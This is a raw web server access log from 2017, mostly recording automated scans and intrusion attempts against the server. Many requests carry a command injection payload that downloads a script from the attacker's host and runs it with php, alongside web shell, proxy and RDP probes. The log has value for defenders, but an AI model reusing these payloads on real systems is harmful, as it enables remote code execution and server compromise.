116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET / HTTP/1.1" 200 8624 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET /main.css HTTP/1.1" 200 11136 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET /main.js HTTP/1.1" 200 19677 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:41 +0000] "GET /firebase-logo.png HTTP/1.1" 200 3542 "http://45.76.177.252:8889/main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:41 +0000] "GET /favicon.ico HTTP/1.1" 200 8624 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:54:07 +0000] "GET /silhouette.jpg HTTP/1.1" 200 4536 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
51.15.12.13 - - [10/Jun/2017:14:58:01 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xF4a\xD7\xD3\xC5X\x97t\x82w\x91\xC4\xD0\x0C\xB2\x8E\x0F\xBFu\xD9\xB4\xFD\xA9:?\xF0\xE7mig2|\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [10/Jun/2017:14:58:02 +0000] "POST / HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:02 +0000] "POST /admin/modules/admindashboard/phpsysinfo/common_admin_functions.php?c=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:03 +0000] "POST /recordings/jeep.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:04 +0000] "POST /admin/bootstrap.inc.php?mgp=danc3Uf%40t HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:04 +0000] "POST /recordings/a7a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:05 +0000] "POST /recordings/emad-shell.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:06 +0000] "POST /recordings/emad.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:06 +0000] "POST /recordings/cmd.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:07 +0000] "POST /recordings/mcd.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:08 +0000] "POST /recordings/dmc.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:08 +0000] "POST /recordings/cmd.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:09 +0000] "POST /recordings/mcd.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:10 +0000] "POST /recordings/dmc.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:11 +0000] "POST /recordings/cmd.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:11 +0000] "POST /recordings/mcd.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:12 +0000] "POST /recordings/dmc.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:13 +0000] "POST /recordings/config.amportal.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:13 +0000] "POST /recordings/scan.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:14 +0000] "POST /vtigercrm/a7a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:15 +0000] "POST /vtigercrm/Hima.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:15 +0000] "POST /vtigercrm/xXx-mat.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:16 +0000] "POST /vtigercrm/Himaa.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:17 +0000] "POST /recordings/3Zz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:18 +0000] "POST /vtigercrm/3Zz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:18 +0000] "POST /vtigercrm/zizo.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:19 +0000] "POST /vtigercrm/ops.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:20 +0000] "POST /vtigercrm/xXx-ELMAYET-xXx.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:20 +0000] "POST /zz.php.call HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:21 +0000] "POST /vtigercrm/z.php?pass=angel HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:22 +0000] "POST /z.php?pass=angel HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:23 +0000] "POST /recordings/lol.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:23 +0000] "POST /recordings/badr2.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:24 +0000] "POST /recordings/Go.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:25 +0000] "POST /recordings/info.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:25 +0000] "POST /recordings/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:26 +0000] "POST /vtigercrm/moaz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:27 +0000] "POST /vtigercrm/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:28 +0000] "POST /11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:28 +0000] "POST /recordings/a8a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:29 +0000] "POST /wav.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:30 +0000] "POST /_asterisk/V-E-M.php?268e31510577740=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:30 +0000] "POST /x1.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:31 +0000] "POST /recordings/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:32 +0000] "POST /panel/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:32 +0000] "POST /webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:33 +0000] "POST /panel/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:34 +0000] "POST /panel/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:34 +0000] "POST /panel/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:35 +0000] "POST /panel/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:35 +0000] "POST /panel/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:36 +0000] "POST /panel/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:36 +0000] "POST /recordings/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:38 +0000] "POST /recordings/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:38 +0000] "POST /recordings/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:39 +0000] "POST /recordings/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:39 +0000] "POST /recordings/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:40 +0000] "POST /recordings/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:40 +0000] "POST /main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:41 +0000] "POST /main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:41 +0000] "POST /vtigercrm/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:42 +0000] "POST /vtigercrm/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:42 +0000] "POST /config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:43 +0000] "POST /recordings/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:44 +0000] "POST /panel/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:44 +0000] "POST /vtigercrm/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:45 +0000] "POST /admin/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:46 +0000] "POST /0x4148.php.call HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:46 +0000] "POST /recordings/misc/?cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:47 +0000] "POST /graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:48 +0000] "POST /recordings/graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:48 +0000] "POST /vtigercrm/graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:49 +0000] "POST /vtigercrm/phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:50 +0000] "POST /recordings/phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [10/Jun/2017:14:58:51 +0000] "POST /phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
91.197.234.40 - - [10/Jun/2017:17:01:18 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=eltons" 400 173 "-" "-"
191.96.249.61 - - [11/Jun/2017:01:09:51 +0000] "GET http://testing0.ipstresser.com/socks_test_logger.php HTTP/1.1" 404 8859 "-" "libcurl-agent/1.0"
221.194.44.190 - - [12/Jun/2017:10:47:53 +0000] "GET /manager/html HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
91.197.234.40 - - [14/Jun/2017:03:10:16 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=eltons" 400 173 "-" "-"
118.123.12.177 - - [14/Jun/2017:09:55:19 +0000] "GET http://123.249.29.201:43210/?rands=_220847856023046211375828 HTTP/1.1" 200 8859 "-" "-"
118.123.12.177 - - [14/Jun/2017:09:55:19 +0000] "GET http://50.117.47.15:28712/?rands=_84706008821375081849104 HTTP/1.1" 200 8859 "-" "-"
163.172.69.33 - - [15/Jun/2017:00:39:44 +0000] "GET /recordings//theme/main.css HTTP/1.1" 200 8859 "-" "curl/7.29.0"
163.172.69.33 - - [15/Jun/2017:00:39:46 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x8A}\x1FP\xB6\xFD\xA5\xD0\xBF\xC2\xB0\x85+~\x05Il{\xEEmB\x9F\xD3\x93{e\x0FA\x1DU\x85\xF9\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [17/Jun/2017:05:36:51 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xCE\x84\x9A|\x11\xE9`\x85\xB4|\xAB\xC9\xF8\x16cD\xE3\xF0\x1C/0\xAF\x95\xF9\xE0\x06\x1F\xFE\xF4>S\xD6\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [17/Jun/2017:05:36:51 +0000] "GET /a2billing/admin/Public/index.php HTTP/1.1" 404 8859 "-" "-"
199.48.164.98 - - [17/Jun/2017:14:11:47 +0000] "GET / HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:48 +0000] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:48 +0000] "GET /HNAP1/ HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:49 +0000] "GET /hudson/script HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:49 +0000] "GET /script HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:50 +0000] "GET /sqlite/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:50 +0000] "GET /sqlitemanager/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:50 +0000] "GET /SQLiteManager/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:51 +0000] "GET /SQLite/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:51 +0000] "GET /SQlite/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:52 +0000] "GET /main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:52 +0000] "GET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:53 +0000] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.48.164.98 - - [17/Jun/2017:14:11:53 +0000] "GET /agSearch/SQlite/main.php HTTP/1.1" 404 8859 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
51.15.12.13 - - [18/Jun/2017:00:12:22 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x10\x16:\x0E\x012\x01\x18h.\x0B`\x8F\x7F\x92\x98\xDA9\xAF\x82{\x9F\xB5\x17>\xF8~\x16\xFD-$\xFB\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:22 +0000] "GET /recordings/index.php HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:23 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03WtX\xCE\x15\x87C\x93\x7F'\x00R\x97\xA4>\xDE\x1F\xF8\x05B\x91N\xF4\xDB6s\xA7\xBB\xCC\xF0\xF0\xAE\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:23 +0000] "POST /admin/ajax.php?module=music HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [18/Jun/2017:00:12:25 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xB3\xD7A\x8DM:n)\xF0\xD5\xE5N l\xBEi](U\xF7\x1B\xE5\xA9\xA4+\x00yq]@6\xC0\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:25 +0000] "POST /admin/ajax.php?module=blacklist HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [18/Jun/2017:00:12:26 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03K\x871A\xAC{\xEBi\xDA\xA0{\x1C\x98S\x93\x05\xA5\xB33\x0F\x1A\x9F1.\x06\xAE\x96\xBC\x11\x0EqI\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:27 +0000] "POST /admin/ajax.php?module=recordings HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [18/Jun/2017:00:12:28 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03" 400 173 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:28 +0000] "GET /admin/ajax.php HTTP/1.1" 404 8859 "/admin/index.php" "-"
51.15.12.13 - - [18/Jun/2017:00:12:30 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03I\xB5\xC6$\xD9\x8A\xC2\xEB\xD0\x94!\x1E\xFD\xF3\xD9\x9D\x88\xF7\xEB7" 400 173 "-" "-"
51.15.12.13 - - [18/Jun/2017:00:12:30 +0000] "GET /admin/config.php?display=OpenVAS&handler=api&file=OpenVAS&module=OpenVAS&function=system&args=id HTTP/1.1" 404 8859 "-" "-"
